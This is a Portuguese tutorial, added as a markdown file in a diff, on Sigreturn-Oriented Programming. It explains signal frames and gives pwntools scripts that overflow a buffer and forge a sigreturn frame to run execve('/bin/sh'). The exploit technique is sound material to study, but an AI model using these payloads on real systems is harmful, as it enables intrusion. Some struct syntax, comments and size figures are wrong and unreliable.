@@ -1,0 +1,375 @@
+---
+title: SIGROP (Sigreturn-Oriented Programming)
+---
+
+Sigreturn é quando um programa é interrompido por um sinal (SIGINT, SIGSEV, etc). 
+
+Quando o programa é interrompido, o kernel salva TODO o estado do programa (registradores). Ao retornar (`sigreturn()`), restaura TUDO o que estava salvo.
+
+Normalmente estamos acostumados como o SIGSEV, que é um erro grave do programa e ele encerra imediatamente. Mas outros erros, como SIGINT, SIGALRM, etc, apenas param a execução salvam o estado, fazem algo e depois voltam exatamente do estado salvo.
+
+|Sinal	|Significado	|Como acontece	|Padrão|
+|-------|---------------|---------------|------|
+|SIGINT	|INTERRUPT	|Você aperta Ctrl+C no terminal	|Programa para (pode capturar)|
+|SIGSEGV	|SEGMENTATION VIOLATION	|Acesso à memória inválida	|Programa MORRE|
+|SIGALRM	|ALARM	|Timer expira	Programa para |(pode capturar)|
+|SIGUSR1	|USER 1	|Enviado por outro processo	|Programa para (pode capturar)|
+
+Um exemplo de cenário de SIGINT:
+
+1. Programa rodando normalmente
+2. Usuário aperta Ctrl+C → SIGINT
+3. Kernel automaticamente:
+   - Pausa programa
+   - PUSH: Salva RAX, RBX, RCX, RIP, RSP... na pilha
+   - Chama função de tratamento
+4. Tratamento faz algo (ex: salvar arquivo)
+5. sigreturn() automático:
+   - POP: **Restaura RAX, RBX, RCX, RIP, RSP...**
+   - Continua execução normal
+
+Podemos forjar uma estrutura na pilha que simula um estado salvo, e chamar `sigreturn()` para carregar nossos valores em TODOS os registradores de uma vez! Isso pois o kernel não verifica se o estado sendo restaurado é legítimo.
+
+Isso evita ter que usar muitos gadgets, como fazemos no ROP comum. No SIGROP, controlamos tudo com uma só chamada.
+
+## Fazendo o SIGROP
+
+### Entendendo a struct
+
+Quando o kernel salva estado para um sinal, ele cria uma struct na pilha que contém todo o estado do programa atual. Essa struct está simulada em C abaixo:
+
+```c
+// Estado da FPU - Pode ser omitido, pois é apenas um ponteiro na struct.
+struct _fpstate {
+    uint64_t cwd;
+    uint64_t swd;
+    // ... muitos campos
+};
+
+// Estrutura dos registradores (SIGCONTEXT)
+struct sigcontext {
+    // Registradores de propósito geral
+    uint64_t r8, r9, r10, r11, r12, r13, r14, r15, rdi, rsi, rbp;
+    uint64_t rbx;      // Base Pointer
+    uint64_t rdx;rax;rcx;
+    uint64_t rsp;      // Stack Pointer
+    uint64_t rip;      // Instruction Pointer (CRÍTICO!)
+    uint64_t eflags;   // Flags da CPU
+    
+    // Registradores de segmento (x86_64)
+    uint16_t cs;       // Code Segment (deve ser 0x33)
+    uint16_t gs;
+    uint16_t fs;
+    uint16_t __pad0;
+    
+    // Informações de erro
+    uint64_t err, trapno, oldmask;
+    uint64_t cr2;      // Page Fault Address
+    
+    // Ponteiro para estado FPU
+    struct _fpstate *fpstate;
+    
+    // Reservado
+    uint64_t __reserved1[8];
+};
+
+// Stack do usuário
+typedef struct {
+    void *ss_sp;
+    int ss_flags;
+    size_t ss_size;
+} stack_t;
+
+// Contexto do usuário
+struct ucontext {
+    unsigned long uc_flags;
+    struct ucontext *uc_link;
+    stack_t uc_stack;
+    struct sigcontext uc_mcontext;  // REGISTRADORES AQUI! (O QUE MANIPULAMOS)
+    sigset_t uc_sigmask;            // Máscara de sinais
+    char __pad[120];                // Padding para alinhamento
+};
+
+// Estrutura COMPLETA na pilha
+struct rt_sigframe {
+    void *pretcode;            // Para retornar do signal handler
+    struct ucontext uc;        // Contexto completo
+    siginfo_t info;            // Informação do sinal (128 bytes)
+    // fpstate pode vir aqui se necessário
+};
+```
+
+Na stack, teríamos algo como:
+
+```
+OFFSET  TAMANHO  CAMPO                   IMPORTÂNCIA
+------  -------  ----------------------  ------------------------------------
+0x000   8        pretcode                ⚠️ Início do rt_sigframe
+0x008   8        uc.uc_flags             🟡 Pode ser 0
+0x010   8        uc.uc_link              🟡 Pode ser 0
+0x018   8        uc.uc_stack.ss_sp       🟡 Pode ser 0
+0x020   8        uc.uc_stack.ss_flags    🟡 Pode ser 0
+0x028   8        uc.uc_stack.ss_size     🟡 Pode ser 0
+                                                                             
+═══════════════════════════ SIGCONTEXT COMEÇA AQUI! ═════════════════════════
+                                                                             
+0x030   8        r8                      🟡 Pode ser 0
+0x038   8        r9                      🟡 Pode ser 0
+0x040   8        r10                     🟡 Pode ser 0
+0x048   8        r11                     🟡 Pode ser 0
+0x050   8        r12                     🟡 Pode ser 0
+0x058   8        r13                     🟡 Pode ser 0
+0x060   8        r14                     🟡 Pode ser 0
+0x068   8        r15                     🟡 Pode ser 0
+0x070   8        rdi                     🔴 1º ARG (ponteiro "/bin/sh")
+0x078   8        rsi                     🔴 2º ARG (argv = 0/NULL)
+0x080   8        rbp                     🟡 Pode ser 0 (se não usar)
+0x088   8        rbx                     🟡 Pode ser 0
+0x090   8        rdx                     🔴 3º ARG (envp = 0/NULL)
+0x098   8        rax                     🔴 SYSCALL NUMBER (59=execve)
+0x0A0   8        rcx                     🟡 Pode ser 0
+0x0A8   8        rsp                     🔴 STACK POINTER (deve ser válido!)
+0x0B0   8        rip                     🔴 INSTRUCTION POINTER (syscall addr)
+0x0B8   8        eflags                  🟡 0x202 (interrupts enabled)
+0x0C0   2        cs                      🔴 0x33 (64-bit user code segment)
+0x0C2   2        gs                      🟡 Pode ser 0
+0x0C4   2        fs                      🟡 Pode ser 0
+0x0C6   2        __pad0                  🟡 Pode ser 0
+0x0C8   8        err                     🟡 Pode ser 0
+0x0D0   8        trapno                  🟡 Pode ser 0
+0x0D8   8        oldmask                 🟡 Pode ser 0
+0x0E0   8        cr2                     🟡 Pode ser 0
+0x0E8   8        fpstate                 🟡 Pode ser 0 (NULL)
+0x0F0   8        __reserved1[0]          🟡 Pode ser 0
+0x0F8   8        __reserved1[1]          🟡 Pode ser 0
+0x100   8        __reserved1[2]          🟡 Pode ser 0
+0x108   8        __reserved1[3]          🟡 Pode ser 0
+0x110   8        __reserved1[4]          🟡 Pode ser 0
+0x118   8        __reserved1[5]          🟡 Pode ser 0
+0x120   8        __reserved1[6]          🟡 Pode ser 0
+0x128   8        __reserved1[7]          🟡 Pode ser 0
+                                                                             
+═════════════════════════ FIM DO SIGCONTEXT (0x130) ═════════════════════════
+                                                                             
+0x130   128      uc.uc_sigmask           🟡 16 * 8 = 128 bytes (0s)
+0x1B0   224      uc.__pad                🟡 28 * 8 = 224 bytes (padding)
+0x290   128      info                    🟡 siginfo_t (128 bytes de 0)
+                                                                             
+══════════════════════════ FIM DO RT_SIGFRAME (0x310) ═══════════════════════
+```
+
+### Como fazer a struct na stack
+
+Para fazer o SIGROP vamos chamar usar a syscall `sigreturn()`, que faz a restauração de estado. A `struct sigcontext` precisa vir **imediatamente após a syscall**. Cuidado: Se você criar a struct manualmente (sem pwntools), a syscall `sigreturn()` vai pegar o que estiver na stack, podendo pegar lixo e crashar o programa. Abaixo, vemos como a struct sigcontext
+
+```
+ANTES do sigreturn():
+[Topo da pilha]
+├── ... outros dados ...
+├── POP_RAX_ADDR        ← Retorno atual (pop rax; ret)
+├── 15                  ← Valor para RAX
+├── SYSCALL_ADDR        ← syscall; ret (chama sigreturn)
+└── ↓↓↓ AQUI COMEÇA A STRUCT RT_SIGFRAME ↓↓↓
+    ├── pretcode        ← 8 bytes (lixo/endereço útil)
+    ├── uc_flags        ← 8 bytes (0)
+    ├── uc_link         ← 8 bytes (0)
+    ├── uc_stack.ss_sp  ← 8 bytes (0)
+    ├── uc_stack.ss_flags ← 8 bytes (0)
+    ├── uc_stack.ss_size ← 8 bytes (0)
+    ├── ↓↓↓ AQUI COMEÇA STRUCT SIGCONTEXT ↓↓↓
+    │   ├── r8   = 0
+    │   ├── r9   = 0
+    │   ├── ...
+    │   ├── rdi  = BINSH_ADDR    ← "/bin/sh" aqui!
+    │   ├── rsi  = 0
+    │   ├── ...
+    │   ├── rax  = 59            ← execve syscall number
+    │   ├── ...
+    │   ├── rip  = SYSCALL_ADDR  ← ONDE continuar após sigreturn
+    │   └── [resto do sigcontext + padding]
+    └── ↓↓↓ FIM DO FRAME ↓↓↓
+```
+
+### Cuidados com a struct
+
+Na struct, você só precisa inicializar os registradores que precisa e inicializar os outros com 0. Mas cuidado! Isso pode dar problema para alguns registradores. Imagine se `rsp` for setado como 0, e o programa tentar acessar a stack!
+
+Assim, há alguns registradores que devem ter uma atenção especial:
+
+- `x86_64`
+    - CRÍTICOS (não podem ser 0) - 
+        - `rip`
+        - `rsp/rbp` (se for continuar após syscall)
+        - `cs` (Code Segment, deve ser `0x33` para user-space)
+    - IMPORTANTES (depende) - `rdi`, `rsi`, `rdx`, `rax`
+    - Os outros podem ser setados com 0.
+- `x86`
+    - CRÍTICOS (não podem ser 0)
+        - `eip`
+        - `esp/ebp` (se for continuar após syscall)
+        - `cs` (Code Segment, deve ser `0x73`para user-space)
+        - `ss` (Stack Segment, deve ser `0x7b`)
+        - `ds` (Data Segment, deve ser `0x7b`)
+        - `es` (Extra Segment, deve ser `0x7b`)
+    - IMPORTANTES (depende) - `ebx`, `ecx`, `edx`, `eax`
+    - Os outros podem ser setados com 0.
+
+
+O RBP só importa **se o programa usa RBP explicitamente**, como :
+
+```
+; Acessando variáveis locais com base em rbp
+mov rax, [rbp-8]  ; ← CRASH se RBP inválido!
+
+; Funções que salvam e restauram rbp
+func:
+    push rbp        ; Salva RBP antigo
+    mov rbp, rsp    ; Novo frame pointer
+    ...             ; Usa [rbp+X] para variáveis
+    pop rbp         ; Restaura RBP antigo ← CRASH se RBP inválido!
+    ret
+```
+
+Caso contrário, só o RSP importa (existem programas que fazem tudo com base no RSP).
+
+Mas há exceções para esses registradores críticos. Se você usar o SIGROP para chamar `execve("/bin/sh")`, por exemplo, **o novo processo substitui o espaço de memória e o estado anterior é destruído**. Assim, não importa se houverem registradores inválidos.
+
+Para outras syscalls como `read`, `write`, `open`, **o crash será somente após o syscall**, assim você ainda pode se aproveitar disso para fazer o que tem que ser feito antes do crash.
+
+### Versão sem SigreturnFrame() do pwntools
+
+O payload abaixo é manual, de modo que montamos a struct que o `sigreturn()` pede na mão.
+
+```py
+from pwn import *
+
+context.arch = 'amd64'
+
+# Offsets
+BUFFER_OFFSET = 136
+SYSCALL = 0x400100
+POP_RAX = 0x4000f0
+BINSH = 0x601000
+VALID_STACK = 0x7fffffffe000
+
+payload = b"A" * BUFFER_OFFSET
+
+# 1. Chamar sigreturn
+payload += p64(POP_RAX)
+payload += p64(15)            # sigreturn syscall number
+payload += p64(SYSCALL)       # syscall; ret
+
+# 2. Montar rt_sigframe MANUALMENTE
+# Parte 1: Campos antes do sigcontext (48 bytes)
+frame = b""
+frame += p64(0)              # pretcode
+frame += p64(0)              # uc_flags
+frame += p64(0)              # uc_link
+frame += p64(0)              # uc_stack.ss_sp
+frame += p64(0)              # uc_stack.ss_flags
+frame += p64(0)              # uc_stack.ss_size
+# Total: 6 * 8 = 48 bytes
+
+# Parte 2: sigcontext (começa aqui!)
+# r8-r15 (8 registradores)
+frame += p64(0) * 8
+
+# rdi, rsi, rbp, rbx, rdx, rax, rcx
+frame += p64(BINSH)          # rdi
+frame += p64(0)              # rsi
+frame += p64(VALID_STACK)    # rbp
+frame += p64(0)              # rbx
+frame += p64(0)              # rdx
+frame += p64(59)             # rax = execve
+frame += p64(0)              # rcx
+
+# rsp, rip (CRÍTICOS!)
+frame += p64(VALID_STACK)    # rsp
+frame += p64(SYSCALL)        # rip
+
+# eflags
+frame += p64(0x202)          # interrupts enabled
+
+# cs, gs, fs, pad
+frame += p16(0x33)           # cs (64-bit user)
+frame += p16(0)              # gs
+frame += p16(0)              # fs
+frame += p16(0)              # pad
+
+# err, trapno, oldmask, cr2
+frame += p64(0) * 4
+
+# fpstate + reserved[8]
+frame += p64(0)              # fpstate
+frame += p64(0) * 8          # reserved
+
+# Parte 3: uc_sigmask + padding (128 + 224 bytes)
+frame += p64(0) * 16         # uc_sigmask (128 bytes)
+frame += p64(0) * 28         # padding para 16-byte align (224 bytes)
+
+# Parte 4: siginfo_t (128 bytes) - opcional mas presente
+frame += p64(0) * 16         # 128 bytes
+
+payload += frame
+
+print(f"Frame size: {len(frame)} bytes")
+print(f"Total payload: {len(payload)} bytes")
+# Resultado: 48 + 320 + 128 + 224 + 128 = ~848 bytes
+```
+
+### Versão com SigreturnFrame() do pwntools
+
+O pwntools possui uma ferramenta própria, o `SigreturnFrame`. Ele já possui toda a struct do sigreturn que precisamos. É importante ressaltar que todos os registradores que não definimos serão inicializados com 0 por padrão.
+
+Indico utilizar essa ferramenta, que agiliza a criação do payload e evita erros desnecessários.
+
+```py
+from pwn import *
+
+# Contexto da arquitetura
+context.arch = 'amd64'
+context.os = 'linux'
+
+# Conectar ao alvo
+# p = process('./vulneravel')
+# OU
+# p = remote('alvo.com', 1234)
+
+# OFFSETS (você precisa descobrir esses)
+BUFFER_OFFSET = 136
+SYSCALL_ADDR = 0x400100  # Endereço de um gadget "syscall; ret"
+POP_RAX_ADDR = 0x4000f0  # Gadget "pop rax; ret"
+BINSH_ADDR = 0x601000    # Onde "/bin/sh" está na memória
+
+# Passo 1: Preencher buffer até atingir o endereço de retorno
+payload = b"A" * BUFFER_OFFSET
+
+# Passo 2: Chamar sigreturn (syscall 15)
+payload += p64(POP_RAX_ADDR)  # pop rax; ret
+payload += p64(15)            # RAX = 15 (número da syscall sigreturn)
+payload += p64(SYSCALL_ADDR)  # syscall; ret
+
+# Passo 3: Estrutura forjada do rt_sigframe na pilha
+# O pwntools já cria a estrutura COMPLETA automaticamente
+
+sigframe = SigreturnFrame(kernel='amd64')  # Especifica arquitetura
+sigframe.rax = 59             # syscall execve
+sigframe.rdi = BINSH_ADDR     # endereço de "/bin/sh"
+sigframe.rsi = 0              # argv = NULL
+sigframe.rdx = 0              # envp = NULL
+sigframe.rip = SYSCALL_ADDR   # syscall após sigreturn
+sigframe.rsp = 0x7fffffffe000 # stack válida (IMPORTANTE!)
+sigframe.cs = 0x33            # code segment 64-bit user
+
+# Se quiser ver o que está sendo criado:
+print(f"Tamanho do frame: {len(bytes(sigframe))} bytes")
+# ~440 bytes para x86_64
+
+payload += bytes(sigframe)
+
+# Enviar payload
+# p.send(payload)
+# p.interactive()
+
+print("Payload montado! Tamanho:", len(payload))
+```
